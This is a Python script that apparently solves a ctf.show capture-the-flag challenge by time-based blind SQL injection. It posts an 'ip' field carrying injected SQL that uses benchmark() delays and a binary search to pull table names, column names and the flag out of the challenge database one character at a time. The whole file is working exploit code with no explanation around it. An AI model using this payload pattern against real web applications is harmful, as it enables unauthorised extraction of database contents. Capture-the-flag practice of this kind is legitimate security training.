import time

import requests

url = 'http://def7596e-b71e-44bc-bff6-151fef96126c.challenge.ctf.show/api/'
flag = ''

for i in range(1, 46):
    start = 32
    tail = 126
    while start < tail:
        mid = (start + tail) >> 1
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # payload = 'select group_concat(column_name) from information_schema.columns where table_name="ctfshow_flagxccb"'
        payload = 'select group_concat(flagaabc) from ctfshow_flagxccb'
        data = {
            'ip': f"1) or if(ascii(substr(({payload}), {i}, 1))>{mid},benchmark(1000000,md5(1)), 1",
            'debug': '0'
        }
        try:
            res = requests.post(url, data=data, timeout=0.5)
            tail = mid
        except Exception as e:
            start = mid + 1
        time.sleep(1)
    if start != 32:
        flag += chr(start)
        print(flag)
    else:
        break
